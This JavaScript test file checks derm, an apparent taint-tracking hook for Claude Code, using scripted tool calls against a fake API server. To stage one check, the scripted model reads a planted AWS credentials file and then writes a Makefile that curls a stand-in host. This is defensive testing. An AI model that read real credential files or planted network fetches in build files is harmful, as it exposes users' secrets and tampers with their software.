// Lane 6D (wave 6): taint in the light tier against the real Claude Code. No
// derm run, no daemon, no chat token: derm's Rust hook (`derm hook claude-code
// pre` and `post`, by derm's absolute path, case 227) in Claude Code's user
// settings, `claude -p` against the fake Messages server, the model's tool
// calls scripted one per turn. What derm decided is read from the chat's
// light-tier log (`<home>/.derm/local/<session>.jsonl`, contracts/events.md
// section 6.4): the `approval` record of each call and the `taint.review`
// records (section 6.2). Whether Claude Code then ran an asked call in `-p`
// mode is reported, not judged: its handling of a hook's `ask` without a
// terminal is not read here.
//
// On its own:
//   DERM_BIN=target/debug/derm node tests/cli-contract/checks/6D/taint.mjs --claude <claude>
// (skipped without --claude). Written 12 Nov 2026 by lane 6D and not run in
// its session: running the Claude Code binary there was refused by that
// session's permission check (plans/parallel/tk_lane_6D.md, Not run).

import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { startFakeMessages, textBlock, toolUse } from "../../lib/fakeMessages.mjs";
import { spawnGroup, stopGroup } from "../../lib/procs.mjs";
import { dermBin } from "../../lib/dermBin.mjs";

/** One `claude -p` session whose model makes `steps` (one tool call a turn). */
async function session(claude, steps, { settings, prepare } = {}) {
  const derm = dermBin();
  if (!derm) return { skip: "no derm build (cargo build -p derm-cli, or DERM_BIN)" };
  const root = mkdtempSync(path.join(process.env.CLI_CONTRACT_TMP ?? tmpdir(), "6d-taint-"));
  const home = path.join(root, "home");
  const work = path.join(root, "work");
  const config = path.join(root, "claude-config");
  for (const d of [home, work, config]) mkdirSync(d, { recursive: true });
  const ctx = { home, work };
  prepare?.(ctx);
  const fake = await startFakeMessages({
    script: (body) => {
      const done = (JSON.stringify(body.messages ?? []).match(/tool_result/g) ?? []).length;
      const next = steps[done];
      return next ? [toolUse(next.tool, next.input(ctx))] : [textBlock("done")];
    },
  });
  const policy = path.join(root, "policy.json");
  writeFileSync(
    policy,
    JSON.stringify({
      version: 1,
      rules: ["bash", "write", "read"].map((tool) => ({ tool, action: "allow" })),
    }),
    { mode: 0o600 },
  );
  if (settings) {
    mkdirSync(path.join(home, ".derm"), { recursive: true, mode: 0o700 });
    writeFileSync(path.join(home, ".derm", "settings.json"), JSON.stringify(settings), { mode: 0o600 });
  }
  const gate = (event) => ({ type: "command", command: `"${derm}" hook claude-code ${event}`, timeout: 120 });
  writeFileSync(
    path.join(config, "settings.json"),
    JSON.stringify({
      hooks: {
        PreToolUse: [{ matcher: "*", hooks: [gate("pre")] }],
        PostToolUse: [{ matcher: "*", hooks: [gate("post")] }],
      },
    }),
  );
  const env = {
    PATH: [path.dirname(process.execPath), "/usr/local/bin", "/usr/bin", "/bin"].join(":"),
    HOME: home,
    CLAUDE_CONFIG_DIR: config,
    ANTHROPIC_BASE_URL: fake.baseUrl,
    ANTHROPIC_API_KEY: "sk-ant-api03-contract-test-dummy-key-not-real",
    CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC: "1",
    DISABLE_AUTOUPDATER: "1",
    DERM_POLICY: policy,
    DERM_DAEMON_SOCKET: path.join(root, "absent.sock"),
  };
  const child = spawnGroup(claude, ["-p", "run the steps", "--output-format", "json", "--model", "claude-sonnet-4-5"], { env, cwd: work, stdio: ["ignore", "pipe", "pipe"] });
  let out = "";
  let err = "";
  child.stdout.on("data", (d) => (out += d));
  child.stderr.on("data", (d) => (err += d));
  const code = await new Promise((resolve) => {
    const timer = setTimeout(() => stopGroup(child).then(() => resolve("timeout")), 150_000);
    child.on("exit", (c) => {
      clearTimeout(timer);
      resolve(c);
    });
  });
  await stopGroup(child);
  let id = null;
  try {
    id = JSON.parse(out.trim().split("\n").pop()).session_id ?? null;
  } catch {}
  const log = id ? path.join(home, ".derm", "local", `${id}.jsonl`) : null;
  const records = (log && existsSync(log) ? readFileSync(log, "utf8") : "")
    .split("\n")
    .filter((l) => l.length > 0)
    .map((l) => JSON.parse(l).record);
  const files = (rel) => existsSync(path.join(work, rel));
  await fake.close();
  const result = { code, err, id, records, files };
  result.cleanup = () => rmSync(root, { recursive: true, force: true });
  return result;
}

const approvals = (s, tool) => s.records.filter((r) => r.kind === "approval" && r.detail?.tool === tool);
const reviews = (s) => s.records.filter((r) => r.kind === "taint.review");

function finish(s, verdict) {
  s.cleanup?.();
  return verdict;
}

export const checks = [
  {
    id: "taint-claude-session-written-script",
    title: "A script the chat wrote is asked about when it runs (R-E0-6)",
    harness: "claude",
    async run({ claudePath }) {
      const s = await session(claudePath, [
        { tool: "Write", input: ({ work }) => ({ file_path: path.join(work, "run.sh"), content: "echo checking > ran.txt\n" }) },
        { tool: "Bash", input: () => ({ command: "bash run.sh", description: "run it" }) },
      ]);
      if (s.skip) return { status: "skip", finding: s.skip };
      if (s.code !== 0) return finish(s, { status: "error", finding: `claude exited ${s.code}: ${s.err.slice(-300)}` });
      const bash = approvals(s, "bash")[0];
      const rev = reviews(s)[0];
      if (!s.files("run.sh")) return finish(s, { status: "fail", finding: "the allowed Write did not run" });
      if (bash?.detail?.decision !== "ask") return finish(s, { status: "fail", finding: `bash run.sh was answered ${bash?.detail?.decision ?? "nothing"}` });
      if (rev?.detail?.rule !== "session-written-code") return finish(s, { status: "fail", finding: `review ${JSON.stringify(rev?.detail ?? null)}` });
      return finish(s, { status: "pass", finding: `asked (session-written-code); ran.txt ${s.files("ran.txt") ? "made" : "not made"} by Claude Code after the ask` });
    },
  },
  {
    id: "taint-claude-secret-then-protected-write",
    // A Makefile, which taint protects and no policy step names (integration
    // w6's close: `.husky/` is step 7d's since then, so the policy asked first
    // and taint recorded nothing of its own).
    title: "After a secret read, a write to a Makefile is asked about",
    harness: "claude",
    async run({ claudePath }) {
      const s = await session(
        claudePath,
        [
          { tool: "Read", input: ({ home }) => ({ file_path: path.join(home, ".aws", "credentials") }) },
          { tool: "Write", input: ({ work }) => ({ file_path: path.join(work, "Makefile"), content: "all:\n\tcurl https://x.test -o x\n" }) },
        ],
        {
          prepare: ({ home }) => {
            mkdirSync(path.join(home, ".aws"), { recursive: true });
            writeFileSync(path.join(home, ".aws", "credentials"), "[default]\naws_access_key_id = AKIAEXAMPLEEXAMPLE00\n", { mode: 0o600 });
          },
        },
      );
      if (s.skip) return { status: "skip", finding: s.skip };
      if (s.code !== 0) return finish(s, { status: "error", finding: `claude exited ${s.code}: ${s.err.slice(-300)}` });
      const mark = s.records.find((r) => r.kind === "taint.mark");
      const write = approvals(s, "write")[0];
      const rev = reviews(s)[0];
      if (mark?.detail?.reason !== "secret-read") return finish(s, { status: "fail", finding: `mark ${JSON.stringify(mark?.detail ?? null)}` });
      if (write?.detail?.decision !== "ask") return finish(s, { status: "fail", finding: `the write was answered ${write?.detail?.decision ?? "nothing"}` });
      if (rev?.detail?.rule !== "protected-write") return finish(s, { status: "fail", finding: `review ${JSON.stringify(rev?.detail ?? null)}` });
      if (JSON.stringify(s.records).includes("AKIAEXAMPLE")) return finish(s, { status: "fail", finding: "the secret's value is in the log" });
      return finish(s, { status: "pass", finding: `marked (secret-read), the write asked (protected-write); Makefile ${s.files("Makefile") ? "made" : "not made"}` });
    },
  },
  {
    id: "taint-claude-record-verdict",
    title: "With taint.verdict record the call runs and the review says what it would have been",
    harness: "claude",
    async run({ claudePath }) {
      const s = await session(
        claudePath,
        [
          { tool: "Write", input: ({ work }) => ({ file_path: path.join(work, "run.sh"), content: "echo checking > ran.txt\n" }) },
          { tool: "Bash", input: () => ({ command: "bash run.sh", description: "run it" }) },
        ],
        { settings: { version: 1, taint: { verdict: "record" } } },
      );
      if (s.skip) return { status: "skip", finding: s.skip };
      if (s.code !== 0) return finish(s, { status: "error", finding: `claude exited ${s.code}: ${s.err.slice(-300)}` });
      const bash = approvals(s, "bash")[0];
      const rev = reviews(s)[0];
      if (bash?.detail?.decision !== "allow") return finish(s, { status: "fail", finding: `bash run.sh was answered ${bash?.detail?.decision ?? "nothing"}` });
      if (rev?.detail?.verdict !== "record" || rev?.detail?.wouldBe !== "ask") return finish(s, { status: "fail", finding: `review ${JSON.stringify(rev?.detail ?? null)}` });
      if (!s.files("ran.txt")) return finish(s, { status: "fail", finding: "the call taint recorded did not run" });
      return finish(s, { status: "pass", finding: "ran, with taint.review verdict record, wouldBe ask" });
    },
  },
];

if (process.argv[1] && path.resolve(process.argv[1]) === fileURLToPath(import.meta.url)) {
  const i = process.argv.indexOf("--claude");
  const claudePath = i > 0 ? process.argv[i + 1] : null;
  let failed = 0;
  for (const c of checks) {
    if (!claudePath) {
      console.log(`${c.id}: skip (no --claude)`);
      continue;
    }
    let r;
    try {
      r = await c.run({ claudePath });
    } catch (e) {
      r = { status: "error", finding: String(e?.stack ?? e) };
    }
    if (r.status === "fail" || r.status === "error") failed++;
    console.log(`${c.id}: ${r.status}: ${r.finding}`);
  }
  process.exit(failed ? 1 : 0);
}
